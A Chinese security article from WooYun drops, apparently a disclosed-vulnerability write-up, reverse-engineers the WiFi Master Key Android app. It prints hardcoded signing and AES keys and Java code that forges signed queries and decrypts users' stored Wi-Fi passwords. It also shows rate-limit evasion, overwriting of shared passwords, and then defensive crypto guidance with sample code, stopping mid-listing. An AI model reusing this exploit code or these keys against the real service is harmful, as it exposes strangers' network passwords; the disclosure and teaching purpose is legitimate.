# Android密码学相关

Android密码学相关-案例wifi万能钥匙
-----------------------

* * *

[TOC]

### 起因

* * *

*   考虑文章可读性未做过多马赛克,又希望不对厂商造成过多影响,故发布文章距离文章完成已经有些时日,如有出入欢迎指正.(关联漏洞厂商给了低危,想来就厂商看来此风险威胁不大)
    
*   作者不擅长加解密方面,很多知识都是临时抱佛脚,现学现卖的.
    
*   之前文章有反馈说理论太多容易引起生理不适,这篇直接先上案例看看效果.
    
*   乌云主站此类漏洞很少,希望文章能够抛砖引玉带动大家挖掘此类漏洞.
    
*   有些好案例但未到解密期限,后续可能会补上(比如签名算法和密码在native层/破解签名加密算法后编写程序fuzz后端漏洞....).
    

网上盛传wifi万能钥匙侵犯用户隐私默认上传用户wifi密码,导致用户wifi处于被公开的状态

有朋友在drops发文分析此软件:http://drops.wooyun.org/papers/4976,其中提到

> 此外接口请求中有一个sign字段是加签，事实上是把请求参数合并在一起与预置的key做了个md5，细节就不赘述了。这两个清楚了之后其实完全可以利用这个接口实现一个自己的Wifi钥匙了。

对此处比较感兴趣,一般摘要和加密会做到so里来增加逆向难度,但是wifi万能钥匙直接是再java层做的算法尝试顺着文章作者思路去解一下这个算法.

关联漏洞:[WooYun: WIFI万能钥匙密码查询接口算法破解（可无限查询用户AP明文密码）](http://www.wooyun.org/bugs/wooyun-2015-099268)

### 万能钥匙版本

* * *

官网版:

```
android:versionCode="620" android:versionName="3.0.98" package="com.snda.wifilocating"

```

googleplay版:

```
android:versionCode="58" android:versionName="1.0.8" package="com.halo.wifikey.wifilocating"

```

### 摘要算法

* * *

首先抓包分析确定关键字后追踪其调用调用

![](http://drops.javaweb.org/uploads/images/0d06953ec1917cfd24210d9073ed1100c3c42641.jpg)

定位到摘要算法:传入的Map对象后转成数组排序后拼接上传入的string进行md5最后转成大写.

![](http://drops.javaweb.org/uploads/images/b223136a5589606cfd31acae27a8c50d01a7d5a7.jpg)

然后再找到key,到这里看貌似这个key是静态的.

![](http://drops.javaweb.org/uploads/images/834a6f0a59c92822bcf9e3d38c068a0f7a4e9a1a.jpg)

现在可以根据这个写出sign的类了.

```
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

class Digest {
    public static final String key = "LQ9$ne@gH*Jq%KOL";
    public static final String retSn = "d407b1220d9447afac1653c337b00abf";  //服务器返回的retSn需要每次都换...
    /**
     * @param args
     * chanid=guanwang
     */
    public static void main(String[] args) {
        HashMap v1 = new HashMap();
        v1.put("och", "guanwang");
        v1.put("ii", "359250051898912");
        v1.put("appid", "0002");
        v1.put("pid", "qryapwd:commonswitch");
        v1.put("mac","f8:a9:d0:76:e4:31");
        v1.put("lang","cn");
        v1.put("bssid","74:44:01:7a:a4:c2,ec:6c:9f:1e:3b:f5,74:44:01:7a:a4:c0,20:4e:7f:85:92:01,cc:b2:55:e2:77:70,1c:fa:68:14:a3:d5,8c:be:be:24:be:48,c0:61:18:2c:89:12,a4:93:4c:b1:ee:31,a6:93:4c:b1:ee:31,c8:3a:35:09:c3:38,78:a1:06:3f:e0:fc,2a:2c:b2:ff:32:3b,a8:57:4e:03:5a:ba,28:2c:b2:ff:32:3b,5c:63:bf:cd:d1:68,");
        v1.put("v","620");
        v1.put("ssid","OpenWrt,.........,hadventure,Netcore,Serial-beijing_5G,fao706,linksys300n,willtech,serial_guest,adata,Excel2,Newsionvc,Excellence,ShiningCareer,");
        v1.put("method","getSecurityCheckSwitch");
        v1.put("uhid", "a0000000000000000000000000000001");
        v1.put("st", "m");
        v1.put("chanid", "guanwang");
        v1.put("dhid", "4028b2994b722389014bcf2e2c6466ea");  //查询频繁被ban后可以尝试更改此处

        String sign = digest(v1,key);
        System.out.println("sign=="+sign);   //固定盐算sign
        System.out.println("sign2=="+digest(v1,retSn)); //变化盐算sign
    }

    public static String digest(Map paramMap, String paramString)
      {
        new StringBuilder("---------------key of md5:").append(paramString).toString();
        Object[] arrayOfObject = paramMap.keySet().toArray();  //转为数组
        Arrays.sort(arrayOfObject);  //排序
        StringBuilder localStringBuilder = new StringBuilder();
        int i = arrayOfObject.length;
        for (int j = 0; j < i; j++)
          localStringBuilder.append((String)paramMap.get(arrayOfObject[j])); //拼接
        localStringBuilder.append(paramString);   //加盐
        //System.out.println("string=="+localStringBuilder.toString());
        return md5(localStringBuilder.toString()).toUpperCase();  //算出md5
      }

      public final static String md5(String s) {
             char hexDigits[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};       
             try {
                 byte[] btInput = s.getBytes();
                 // 获得MD5摘要算法的 MessageDigest 对象
                 MessageDigest mdInst = MessageDigest.getInstance("MD5");
                 // 使用指定的字节更新摘要
                 mdInst.update(btInput);
                 // 获得密文
                 byte[] md = mdInst.digest();
                 // 把密文转换成十六进制的字符串形式
                 int j = md.length;
                 char str[] = new char[j * 2];
                 int k = 0;
                 for (int i = 0; i < j; i++) {
                     byte byte0 = md[i];
                     str[k++] = hexDigits[byte0 >>> 4 & 0xf];
                     str[k++] = hexDigits[byte0 & 0xf];
                 }
                 return new String(str);
             } catch (Exception e) {
                 e.printStackTrace();
                 return null;
             }
         }
}

```

修改请求包后重新计算sign,再次发包.结果却不是预期那样,依然返回的是

```
{"retCd":"-1111","retMsg":"商户数字签名错误，请联系请求发起方！","retSn":"141356b44efd487ca0c333d8bec89da9"}

```

而且还有一个奇怪retSN,之前查询成功也有retSn的.到这里开始怀疑key不是那么简单的一直是不变的.于是我用xposed hook了其md5方法的传入参数.

```
package org.wooyun.xposedhook;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

public class Main implements IXposedHookLoadPackage {

    @Override
    public void handleLoadPackage(LoadPackageParam lpparam) throws Throwable {
        // TODO Auto-generated method stub
        if (!lpparam.packageName.equals("com.snda.wifilocating")) {
            // XposedBridge.log("loaded app:" + lpparam.packageName);
            return;
        }
        findAndHookMethod("com.snda.wifilocating.f.ae", lpparam.classLoader, "a", String.class, new XC_MethodHook() {

                    @Override
                    protected void beforeHookedMethod(MethodHookParam param)
                            throws Throwable {
                        // TODO Auto-generated method stub
                        // String result = (String) param.getResult();
                        XposedBridge.log("---input---:" + param.args[0]);
                        super.beforeHookedMethod(param);

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param)
                            throws Throwable {
                        // TODO Auto-generated method stub
                        XposedBridge.log("---output---:" + param.getResult());
                        super.afterHookedMethod(param);
                    }

                });

    }

}

```

![](http://drops.javaweb.org/uploads/images/47bb6ef646a20ba57899742605c3c00e687850bc.jpg)

通过hook发现大部分请求的sign是按照之前分析的方法计算出的,但是在查询密码处计算sign的key一直在变化的,这里是一个动态的key

![](http://drops.javaweb.org/uploads/images/c981c84d8d42a04d8cb1888dff555a08daa0f466.jpg)

再返回去分析摘要算法的调用情况来追踪动态key如何产生的,交叉引用xrefs

![](http://drops.javaweb.org/uploads/images/c26bd54634798f2da6867e67b6858dc4013aee7d.jpg)

原来计算sign的方式还请求包中pid的值有关

![](http://drops.javaweb.org/uploads/images/a919c6e72793b037774bd662d0fb5ee01ad89653.jpg)

当pid=qryapwd:commoanswith所用的key并非之前提到的静态密钥,而且调用一个方法,追踪此方法发现此参数是从默认的shared_prefs文件中读取的.如果为空才使用静态密钥.(分享wifi密码和查询wifi密码均进入此条件)

![](http://drops.javaweb.org/uploads/images/23a564993e6e5ca3b3167d5b55f6036dadfa9359.jpg)

![](http://drops.javaweb.org/uploads/images/7936aded3be87953793b1c23fec502046d158712.jpg)

那么shared_prefs默认文件中的值又是从哪里生成的了?通过抓包可以发现这个是由服务器返回的.每次查询后都会更新

![](http://drops.javaweb.org/uploads/images/0993b54e251ca5c4ec36f75cc84e1d0621871ddf.jpg)

现在已经完全了解官网版本的两种摘要算法,可以自己构造请求来查询wifi密码了.

### 请求频率与dhid

* * *

在之后的测试发现如果查询过于频繁会被服务器给ban掉,通过fuzz发现服务器是通过dhid这个参数来判断是请求来源是否为同一设备,修改dhid然后重新计算sign发包.此处的sign是通过上文digest(v1,retSn)算出的.

![](http://drops.javaweb.org/uploads/images/6722d798f4d79f09ea36cd04e1f95a8743f960dc.jpg)

显然dhid也做了合法性效验,继续探索dhid是如何生成的,客户端是从私有文件中取得dhid的,而客户端的dhid是由应用安装后发送请求由服务器返回的.

通过修改此处请求并重新计算sign就可以得到新的dhid来突破请求限制了.此处的sign是通过上文digest(v1,key)算出的.(参数字段也要修改)

### 老版本遗留问题

* * *

在搜索wifi万能钥匙早期版本的过程中,发现googleplay上的版本为早期1.x version的.摘要算法和加密算法都基本和新版本一致只不过密钥不同.服务端通过v参数(版本号)来区分计算sign.

googleplay版的查询wifi密码后并未返回retSn,通过hook和逆向确定此版本wifi密码查询功能并未使用服务器返回的retSn来作为摘要算法的盐.而是使用之前分析的固定key的方式计算sign.这就使得我们制作自己的wifi密码查询小工具变得简单多了.

这就是摘要算法/加密算法被破解后危害的持续性,因为此类漏洞的修补不仅仅是服务端代码更新且需要同步客户端同步更新,但是又无法保证每个用户都更新客户端,为了可用性而牺牲安全性.一般妥协的做法就是兼容方式的为不同时期的客户端提供不同的服务,当然用户体验还是一致的,只是现实方式略有区别.

### pwd加密算法分析

* * *

查询密码后服务器返回的wifi密码是加密过的,但是这种加密客户端必定对应有解密算法.你的剑就是我的剑.

![](http://drops.javaweb.org/uploads/images/e0b51e74765b82bced2a39c003064a71494fc8e7.jpg)

```
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AES {
    static Cipher cipher;
    static final String KEY_ALGORITHM = "AES";
    /*
     * chanid=guanwang  官网版解密
     */
    static final String CIPHER_ALGORITHM_CBC_NoPadding = "AES/CBC/NoPadding"; 
    static SecretKey secretKey;

    public static void main(String[] args) throws Exception {
        System.out.println(method4("A8A839A49A25420E3E0E67AA1B22EDCCA3825A7610258FAAEAF26C4200F68C47"));// length = n*16
    }

    static byte[] getIV() {
        String iv = "j#bd0@vp0sj!3jnv"; //IV length: must be 16 bytes long
        return iv.getBytes();
    }

    static String method4(String str) throws Exception {
        cipher = Cipher.getInstance(CIPHER_ALGORITHM_CBC_NoPadding);
        String key = "jh16@`~78vLsvpos";
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
        byte[] arrayOfByte1 = null;
        cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(getIV()));//使用解密模式初始化 密钥
          while (true)
          {

            int i = str.length();
            arrayOfByte1 = null;
            if (i >= 2)
            {
              int j = str.length() / 2;
              arrayOfByte1 = new byte[j];
              for (int k = 0; k < j; k++)
                arrayOfByte1[k] = ((byte)Integer.parseInt(str.substring(k * 2, 2 + k * 2), 16));
            }
            byte[] arrayOfByte2 = cipher.doFinal(arrayOfByte1);
            return new String(arrayOfByte2);
          }

    }

}

```

### 伪造wifi密码

* * *

如果不想改密码还可以伪造分享ap请求来覆盖之前的密码,依然需要计算sign哦.

![](http://drops.javaweb.org/uploads/images/8630e22fa36dd7b1ff897595c8f3cdd35391845d.jpg)

![](http://drops.javaweb.org/uploads/images/f27014efd18a8af262044b11a83f07b06f7cf093.jpg)

再覆盖一次.

![](http://drops.javaweb.org/uploads/images/5b2384f17d836f84b88a030847d2b39ab711894e.jpg)

### wifi密码查询小工具

* * *

综合上述分析就可以制作出自己的wifi密码查询工具了.

![](http://drops.javaweb.org/uploads/images/ec9c32ef6748a217fdaae82ebab67e619343b814.jpg)

![](http://drops.javaweb.org/uploads/images/749a0148f0d51db8aaedf79478d5b0df3b206311.jpg)

顺手也写了一个android客户端.

![](http://drops.javaweb.org/uploads/images/95bb8928b1a5bbc8e20042a7a9dcf8f2d519e766.jpg)

### 乌云案例

本地加解密:

[WooYun: 逆向分析苏宁易购安卓客户端加密到解密获取明文密码（附demo验证）](http://www.wooyun.org/bugs/wooyun-2015-0108500)

签名算法脆弱:

[WooYun: 逆向人人客户端，破解校验算法之<暴力破解+撞库>](http://www.wooyun.org/bugs/wooyun-2015-0106692)

[WooYun: 360移动端可被破解之撞库攻击（轻松撞出几十万)](http://www.wooyun.org/bugs/wooyun-2015-0106778)

[WooYun: PPTV(PPlive)客户端批量刷会员漏洞](http://www.wooyun.org/bugs/wooyun-2015-0110075)

### 小结

由案例可知应用密码学相关的设计一定要在项目初始设计完善,不然后患无穷而且很难修复.

sign的算法因为必然存在客户端里,所有终究会被定位到,只是难易程度不同.所以在sign算法的隐藏上下功夫整个方向是不对的.

得想出一种方案让攻击者知道sign的算法也很难利用此算法,例如:计算sign之后对数据进行非对称加密,这时要对sign重新计算sign就无法直接从http包中获取字段,要解密也没有私钥.只有通过hook以及反编译来获得计算的sign的参数变得较为繁琐,如果有必要可以对应用进行加壳使用反编译和hook变得更加困难.

![](http://drops.javaweb.org/uploads/images/11fc8b06a0e4c1c4dea4491a13a98f07a30876a3.jpg)

设计好方案之后的关键就是选择加密算法/密钥存储位置.

Android密码学相关-加密/摘要算法
--------------------

* * *

### 分类

* * *

对称加密(symmetric cryptography)/共享密钥加密(shared-key cryptography):AES/DES/RC4/3DES...

非对称加密(asymmetric cryptography)/公开密钥加密(public-key cryptography):RSA/ECC/Diffie-Hellman...

基于密码加密 password-based encryption (PBE)

摘要/哈希/散列函数:md5/SHA1... (单向陷门/抗碰撞)

优缺点:

由于进行的都是大数计算，使得RSA最快的情况也比DES慢上好几倍，无论是软件还是硬件实现。速度一直是RSA的缺陷。一般来说只用于少量数据加密。RSA的速度比对应同样安全级别的对称密码算法要慢1000倍左右。

### 易混淆概念

* * *

Message Authentication:消息认证是一个过程，用以验证接收消息的真实性（的确是由它所声称的实体发来的）和完整性（未被篡改、插入、删除），同时还用于验证消息的顺序性和时间性（未重排、重放、延迟).

HMAC:是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）,HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成一个消息摘要作为输出。(安全性不依赖哈希算法,依赖密钥)

MAC: Message Authentication Code 消息鉴别码实现鉴别的原理是,用公开函数和密钥产生一个固定长度的值作为认证标识(keyed hash function),用这个标识鉴别消息的完整性.使用一个密钥生成一个固定大小的小数据块,即MAC，并将其加入到消息中,然后传输.接收方利用与发送方共享的密钥进行鉴别认证等

digital signatures 消息的发送者用自己的私钥对消息摘要进行加密，产生一个加密后的字符串，称为数字签名。因为发送者的私钥保密，可以确保别人无法伪造生成数字签名，也是对信息的发送者发送信息真实性的一个有效证明。。数字签名是非对称密钥加密技术与数字摘要技术(hash function)的应用。

Hash 简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。

密钥(key)/密码(password)

一些对比:

*   数字签名使用非对称加密,MACs使用对称加密
*   数字签名可以保证"不可抵赖性",MACs通常不行
*   数字签名可以和哈希函数结合使用,但是哈希函数并不总是数字签名
*   hash函数不使用密钥不能直接用于MAC

### 选择加密算法/摘要算法

* * *

*   密码生成key的加密算法 : AES的key是由使用passwd和salt的方法生成
*   公开密钥加密算法 : RSA
*   预设key的加密算法 : AES使用一个预定义好的key

![](http://drops.javaweb.org/uploads/images/001fde1a7205834628fd2d97e03aacce099d0c6a.jpg)

*   特别重要的用户数据加解密/签名验证应选择基于密码生成key的加密算法 (PBE)
*   本地加解密/签名验证使用预置key的加密算法 (对称加密)
*   客户端/服务端通信...加解密/签名验证使用公钥加密算法 (非对称加密)

![](http://drops.javaweb.org/uploads/images/b80cead6db32f7e5661858d8a5babfc24c2d03fe.jpg)

### Protecting Key

* * *

当使用加密技术以确保敏感数据安全（机密性和完整性），如果密钥(key)泄露即使是最强大的加密算法和密钥长度也不能保障来自第三方的攻击.所以一个好的保存密钥的方式变得十分重要.

预置密钥(key):服务端到客户端的通信加密/摘要/签名

密钥协商:由服务端返回密钥/盐值

算法生成密钥:本地数据加解密

![](http://drops.javaweb.org/uploads/images/e7a402a22c82e4748e5fe72c7b1df71a62da22cb.jpg)

key的存储位置

*   手机缓存
    
    password-based encryption:当key由密码加盐生成后就会存储在用户手机的缓存中,再未root的情况下受android沙箱机制保护其他第三方应用是无法读取的.
    
*   应用目录
    
    当key以私有模式存储在应用目录下,在未root的情况下其他应用是无法读取的.如果应用关闭backup功能,就无法通过abd backup备份出key.故当此种场景下为了密钥的安全性建议禁用backup.
    
    如果想在root条件下保护密钥,就必须对密钥进行加密或者混淆.
    
*   APK文件
    
    因为apk中的文件是公开的,所以一般来讲此处不建议存储敏感数据比如key.如果再apk文件中存储了密钥就必须对其进行混淆并且确保其不能被轻易读取到.
    
*   公共存储区域(如Sdcard)
    
    因为公共存储区域是全局可读的,也是不建议存储敏感数据的地方.若key存储在此区域必须进行加密和混淆.
    
*   代码中(dex or so)
    
    硬编码再代码中的key,上文中的提到的wifi万能钥匙的key就是.可以被逆向发现,不建议存储此处.若key存储在此区域必须进行加密和混淆以及对应用加固增加逆向难度.
    

### 建议

* * *

1.当指定的加密算法时显式指定加密模式和填充方式

```
    algorithm/mode/padding

```

2.使用健壮的算法

3.当使用基于密码的加密算法时不能将密码存储在设备中

4.使用密码生成key时记得加盐

```
SecretKey secretKey = generateKey(password, mSalt);

```

5.当使用密码生成key时指定哈希迭代次数

```
private static final int KEY_GEN_ITERATION_COUNT = 1024;
.....
keySpec = new PBEKeySpec(password, salt, KEY_GEN_ITERATION_COUNT, KEY_LENGTH_BITS);

```

6.强制增加密码强度

### 加密使用native方法,so也不一定安全

* * *

1.hook&注入

http://drops.wooyun.org/tips/2986

文章中使用 smali 注入广播接收器后动态修改加密前的字符串的方法非常有效,使用 xposed 实现过程要更为简洁

```
public class Main3 implements IXposedHookLoadPackage {

    private static String tag = "ReceiverControlXposed";

    @Override
    public void handleLoadPackage(LoadPackageParam lpparam) throws Throwable {

        if(!lpparam.packageName.equals("org.wooyun.mybroadcast"))
            return;
        else
            Log.i(tag,lpparam.packageName);
        findAndHookMethod("android.app.Application", lpparam.classLoader, "onCreate", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                Context context = (Context) param.thisObject;
                IntentFilter filter = new IntentFilter(myCast.myAction);
                filter.addAction(myCast.myCmd);
                context.registerReceiver(new myCast(), filter);
            }

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
            }
        });

        // TODO Auto-generated method stub
        findAndHookMethod("org.wooyun.mybroadcast.StringActivity", lpparam.classLoader, "decode" , String.class , new XC_MethodHook() {

            @Override
            protected void beforeHookedMethod(MethodHookParam param)
                    throws Throwable {
                Log.i(tag,"before param : " + param.args[0]);
                param.args[0] = myCast.alter((String) param.args[0]);
                Log.i(tag,"after param : " + param.args[0]);
            }

            @Override
            protected void afterHookedMethod(MethodHookParam param)
                    throws Throwable {

            }
        });
    }

}

```

2.无防护的 so,ida分析/还原/调用

暂缺可公开案例

### 伪随机数生成器(PRNG)

* * *

http://drops.wooyun.org/papers/5164

### 非对称加密:RSA加解密的example

* * *

```
package org.wooyun.digest;

import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public final class RsaCryptoAsymmetricKey {
    // *** POINT 1 *** 明确指定加密模式和填充
    // *** POINT 2 *** 使用健壮的加密方法 (specifically, technologies that meet the relevant criteria), in cluding algorithms, block cipher modes, and padding modes..
    // Parameters passed to getInstance method of the Cipher class: Encryption algorithm, block encryption mode, padding rule
    // In this sample, we choose the following parameter values: encryption algorithm=RSA, block encryption mode=NONE , padding rule=OAEPPADDING.
    private static final String TRANSFORMATION = "RSA/NONE/OAEPPADDING";
    // 指定加密算法
    private static final String KEY_ALGORITHM = "RSA";
    // *** POINT 3 *** 使用足够长度的key以保证加密强度.
    //检测key的长度
    private static final int MIN_KEY_LENGTH = 2000;

    RsaCryptoAsymmetricKey() {
    }

    public final byte[] encrypt(final byte[] plain, final byte[] keyData) {
        byte[] encrypted = null;
        try {
            // *** POINT 1 *** Explicitly specify the encryption mode and the padding.
            // *** POINT 2 *** Use strong encryption methods (specifically, technologies that meet the relevant criteria), including algorithms, block cipher modes, and padding modes..
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            PublicKey publicKey = generatePubKey(keyData);
            if (publicKey != null) {

                cipher.init(Cipher.ENCRYPT_MODE, publicKey);
                encrypted = cipher.doFinal(plain);
            }
        } catch (NoSuchPaddingException e) {
        } catch (InvalidKeyException e) {
        } catch (IllegalBlockSizeException e) {
        } catch (BadPaddingException e) {
        } catch (NoSuchAlgorithmException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } finally {
        }
        return encrypted;
    }

    public final byte[] decrypt(final byte[] encrypted, final byte[] keyData) {

        // In general, decryption procedures should be implemented on the server side;
        //通常说解密过程应该在服务端实现.
        //however, in this sample code we have implemented decryption processing within the application to ensure confirmation of proper execution.
        //但是此实例代码同时实现了解密好让整个加解密正常运行
        // When using this sample code in real-world applications, be careful not to retain any private keys within the application.
        //如果真要用此代码小心不要将私钥存储在客户端中哟.
        byte[] plain = null;
        try {
            // *** POINT 1 *** Explicitly specify the encryption mode and the padding.
            // *** POINT 2 *** Use strong encryption methods (specifically, technologies that meet the relevant criteria), including algorithms, block cipher modes, and padding modes..
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            PrivateKey privateKey = generatePriKey(keyData);
            cipher.init(Cipher.DECRYPT_MODE, privateKey);
            plain = cipher.doFinal(encrypted);
        } catch (NoSuchAlgorithmException e) {
        } catch (NoSuchPaddingException e) {
        } catch (InvalidKeyException e) {
        } catch (IllegalBlockSizeException e) {
        } catch (BadPaddingException e) {
        } finally {
        }
        return plain;
    }

    private static final PublicKey generatePubKey(final byte[] keyData) {
        PublicKey publicKey = null;
        KeyFactory keyFactory = null;
        try {
            keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
            publicKey = keyFactory.generatePublic(new X509EncodedKeySpec(
                    keyData));
        } catch (IllegalArgumentException e) {
        } catch (NoSuchAlgorithmException e) {
        } catch (InvalidKeySpecException e) {
        } finally {
        }
        // *** POINT 3 *** .使用足够长度的key以保证加密强度.
        // 检测key长度
        if (publicKey instanceof RSAPublicKey) {
            int len = ((RSAPublicKey) publicKey).getModulus().bitLength();
            if (len < MIN_KEY_LENGTH) {
                publicKey = null;
            }
        }
        return publicKey;
    }

    private static final PrivateKey generatePriKey(final byte[] keyData) {
        PrivateKey privateKey = null;
        KeyFactory keyFactory = null;
        try {
            keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
            privateKey = keyFactory.generatePrivate(new PKCS8EncodedKeySpec(
                    keyData));
        } catch (IllegalArgumentException e) {
        } catch (NoSuchAlgorithmException e) {
        } catch (InvalidKeySpecException e) {
        } finally {
        }
        return privateKey;
    }
}

```

### 对称加密:AES(PBEKey)加解密的example

* * *

```
package org.wooyun.crypto;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.util.Arrays;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;

public final class AesCryptoPBEKey {
    // *** POINT 1 *** 明确指定加密模式和填充
    // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式    
    //创建Cipher实例传入的参数,算法AES,块加密CBC,填充PKCS7Padding.
    private static final String TRANSFORMATION = "AES/CBC/PKCS7Padding";
    //生成key时创建SecretKeyFactory实例传入的参数
    private static final String KEY_GENERATOR_MODE = "PBEWITHSHAAND128BITAES-CBC-BC";
    // *** POINT 3 *** 用password生成key的时候记得加盐
    // Salt长度,单位 bytes
    public static final int SALT_LENGTH_BYTES = 20;
    // *** POINT 4 *** 用password生成key的时候, 指定合适的hash迭代次数
    // 通过PBE生成key时设置hash迭代次数
    private static final int KEY_GEN_ITERATION_COUNT = 1024;
    // *** POINT 5 *** 使用足够长度的key以保证加密强度. 
    // Key 长度,单位bits
    private static final int KEY_LENGTH_BITS = 128;
    private byte[] mIV = null;
    private byte[] mSalt = null;

    public byte[] getIV() {
        return mIV;
    }

    public byte[] getSalt() {
        return mSalt;
    }

    AesCryptoPBEKey(final byte[] iv, final byte[] salt) {
        mIV = iv;
        mSalt = salt;
    }

    AesCryptoPBEKey() {
        mIV = null;
        initSalt();
    }

    private void initSalt() {
        mSalt = new byte[SALT_LENGTH_BYTES];
        SecureRandom sr = new SecureRandom();
        sr.nextBytes(mSalt);
    }

    public final byte[] encrypt(final byte[] plain, final char[] password) {
        byte[] encrypted = null;
        try {
            // *** POINT 1 *** 明确指定加密模式和填充
            // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            // *** POINT 3 *** 用password生成key的时候记得加盐
            SecretKey secretKey = generateKey(password, mSalt);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            mIV = cipher.getIV();
            encrypted = cipher.doFinal(plain);
        } catch (NoSuchAlgorithmException e) {
        } catch (NoSuchPaddingException e) {
        } catch (InvalidKeyException e) {
        } catch (IllegalBlockSizeException e) {
        } catch (BadPaddingException e) {
        } finally {
        }
        return encrypted;
    }

    public final byte[] decrypt(final byte[] encrypted, final char[] password) {
        byte[] plain = null;
        try {
            // *** POINT 1 *** 明确指定加密模式和填充
            // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            // *** POINT 3 *** 用password生成key的时候记得加盐
            SecretKey secretKey = generateKey(password, mSalt);

            IvParameterSpec ivParameterSpec = new IvParameterSpec(mIV);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivParameterSpec);
            plain = cipher.doFinal(encrypted);
        } catch (NoSuchAlgorithmException e) {
        } catch (NoSuchPaddingException e) {
        } catch (InvalidKeyException e) {
        } catch (InvalidAlgorithmParameterException e) {
        } catch (IllegalBlockSizeException e) {
        } catch (BadPaddingException e) {
        } finally {
        }
        return plain;
    }

    private static final SecretKey generateKey(final char[] password,
            final byte[] salt) {
        SecretKey secretKey = null;
        PBEKeySpec keySpec = null;
        try {
            // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式    
            // 创建一个实例生成key
            //In this example, we use a KeyFactory that uses SHA1 to generate AES-CBC 128-bit keys.
            SecretKeyFactory secretKeyFactory = SecretKeyFactory
                    .getInstance(KEY_GENERATOR_MODE);
            // *** POINT 3 *** 用password生成key的时候记得加盐
            // *** POINT 4 *** 用password生成key的时候, 指定合适的hash迭代次数
            // *** POINT 5 ***使用足够长度的key以保证加密强度.
            keySpec = new PBEKeySpec(password, salt, KEY_GEN_ITERATION_COUNT,
                    KEY_LENGTH_BITS);
            // 清除password
            Arrays.fill(password, '?');
            //生成 key
            secretKey = secretKeyFactory.generateSecret(keySpec);
        } catch (NoSuchAlgorithmException e) {
        } catch (InvalidKeySpecException e) {
        } finally {
            keySpec.clearPassword();
        }
        return secretKey;
    }
}

```

### 签名:AES(PBEKey) HMAC example

* * *

```
package org.wooyun.crypto;

import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.util.Arrays;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;


// PBE:password based encryption

public final class HmacPBEKey {
    // *** POINT 1 *** 明确指定加密模式和填充
    // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式
    //创建Mac类实例传参:PBEWITHHMACSHA1
    private static final String TRANSFORMATION = "PBEWITHHMACSHA1";
    //生成key时创建SecretKeyFactory实例传入的参数
    private static final String KEY_GENERATOR_MODE = "PBEWITHHMACSHA1";
    // *** POINT 3 *** 用password生成key的时候记得加盐 
    // Salt长度,单位 bytes
    public static final int SALT_LENGTH_BYTES = 20;
    // *** POINT 4 *** 用password生成key的时候, 指定合适的hash迭代次数
    // 通过PBE生成key时设置hash迭代次数
    private static final int KEY_GEN_ITERATION_COUNT = 1024;
    // *** POINT 5 *** 使用足够长度的key以保证MAC强度. 
    // strength. 
    // Key长度,单位bits
    private static final int KEY_LENGTH_BITS = 160;
    private byte[] mSalt = null;

    public byte[] getSalt() {
        return mSalt;
    }

    HmacPBEKey() {
        initSalt();
    }

    private void initSalt() {
        // TODO Auto-generated method stub
        mSalt = new byte[SALT_LENGTH_BYTES];
        SecureRandom sr = new SecureRandom();
        sr.nextBytes(mSalt);
    }

    HmacPBEKey(final byte[] salt) {
        mSalt = salt;

    }

    public final byte[] sign(final byte[] plain, final char[] password) {
        return calculate(plain, password);
    }

    private final byte[] calculate(final byte[] plain, final char[] password) {
        byte[] hmac = null;
        try {
            // *** POINT 1 *** 明确指定加密模式和填充
            // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式
            Mac mac = Mac.getInstance(TRANSFORMATION);
            // *** POINT 3 *** 用password生成key的时候记得加盐 
